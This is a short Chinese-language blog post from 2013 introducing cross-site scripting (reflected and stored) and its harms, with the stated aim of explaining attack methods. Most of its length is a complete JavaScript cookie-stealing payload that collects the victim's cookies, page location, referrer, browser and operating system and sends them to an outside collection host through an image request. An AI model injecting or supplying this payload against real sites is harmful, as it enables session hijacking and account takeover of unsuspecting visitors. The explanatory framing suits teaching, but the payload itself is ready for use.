title: XSS(Cross Site Scripting) 跨站脚本
date: 2013-03-23 23:52:12
tags:
- safe
---


> XSS（Cross Site Scripting）中文名跨站脚本攻击。攻击原理是攻击者将恶意代码植入到页面中，导致浏览该页面的用户即会中招！这次主要讲讲攻击方法。

<!-- more -->

按照我的理解XSS也能分为几类，[XSS](http://wufeifei.com/xss.html)、Flash XSS、UXSS等，这篇主要讲下普通XSS，一般XSS也分为两种形态：

1.反射型

 ** 通过构造恶意代码插入链接中，由于过滤不严直接显示在页面内触发XSS **

 2.储存型

  ** 通过表单等地方提交恶意构造代码，后端存入数据库，在显示该数据的页面会触发XSS **
   
简单的理解就是由于过滤不严导致能写入JS代码，获得JS代码控制权后能做很多事情，常见危害如下：
     
* 盗取回话
* 控制用户操作（CSRF）
* 发起DDOS攻击
* 篡改页面
* 等等

针对每一个攻击进行详细讲解：


#### 盗取会话

     服务器是以SESSION来识别用户，而SESSION在客户端浏览器中是存在COOKIE里！也就是说如果我们能拿到某个用户的COOKIE，我们就能获得他帐号的权限了。而JS是可以很方便的取到COOKIE！

流程图：

[![XSS盗取用户会话](http://wufeifei.com/img/XSS盗取会话.png)][]

恶意脚本：

```Javascript
var img = document.createElement("img"),referrer = null,browser = null,screensize = null,system = null
referrer = document.referrer
/*var bro = $.browser
if(/chrome/.test(navigator.userAgent.toLowerCase())){
	browser = 'Chrome' + ' ' + bro.version
}else if(bro.webkit){
	browser = 'Webkit' + ' ' + bro.version
}else if(bro.safari){
	browser = 'Safari' + ' ' + bro.version
}else if(bro.opera){
	browser = 'Opera' + ' ' + bro.version
}else if(bro.msie){
	if(bro.version.slice(0,1) == "8"){
		browser = 'IE8'
	}else if(bro.version.slice(0,1) == "7"){
		browser = 'IE7'
	}else if(bro.version.slice(0,1) == "6"){
		browser = 'IE6'
	}
}else if(bro.mozilla){
	browser = 'Mozilla' + ' ' + bro.version
}*/
browser = navigator.appName
if(/chrome/.test(navigator.userAgent.toLowerCase())){
	browser = "Chrome"
}
screensize = screen.width + '*' + screen.height 
if (navigator.appVersion.indexOf("NT 5.1")!=-1){
	system = 'Windos XP'
}else if(navigator.appVersion.indexOf("NT 6.0")!=-1){
	system = 'Windows Vista'
}else if(navigator.appVersion.indexOf("NT 6.1")!=-1){
	system = 'Windows 7'
}else if(navigator.appVersion.indexOf("Mac OS X 10.0")!=-1){
	system = 'MacOS 猎豹(Cheetah)'
}else if(navigator.appVersion.indexOf("Mac OS X 10.1")!=-1){
	system = 'MacOS 美洲狮(Puma)'
}else if(navigator.appVersion.indexOf("Mac OS X 10.2")!=-1){
	system = 'MacOS 美洲虎(Jaguar)'
}else if(navigator.appVersion.indexOf("Mac OS X 10.3")!=-1){
	system = 'MacOS 黑豹(Panther)'
}else if(navigator.appVersion.indexOf("Mac OS X 10.4")!=-1){
	system = 'MacOS 老虎(Tiger)'
}else if(navigator.appVersion.indexOf("Mac OS X 10.5")!=-1){
	system = 'MacOS 豹子(Leopard)'
}else if(navigator.appVersion.indexOf("Mac OS X 10.6")!=-1){
	system = 'MacOS 雪豹(Snow Leopard)'
}else if(navigator.appVersion.indexOf("Mac OS X 10.7")!=-1){
	system  = 'MacOS 狮子(Lion)'
}else if(navigator.appVersion.indexOf("Mac OS X 10.8")!=-1){
	system = 'MacOS 美洲狮(Mountain Lion)'
}else if(navigator.appVersion.indexOf("Linux")!=-1){
	system = 'Linux'
}else if(navigator.appVersion.indexOf("X11 ")!=-1){
	system = 'Unix'
}
img.src = "http://safe.feei.cn/admin.php?location="+escape(document.location)+"&cookie="+escape(document.cookie)+"&referrer="+escape(referrer)+"&browser="+escape(browser)+"&screensize="+escape(screensize)+"&system="+escape(system);
document.body.appendChild(img);
```
未完待续...
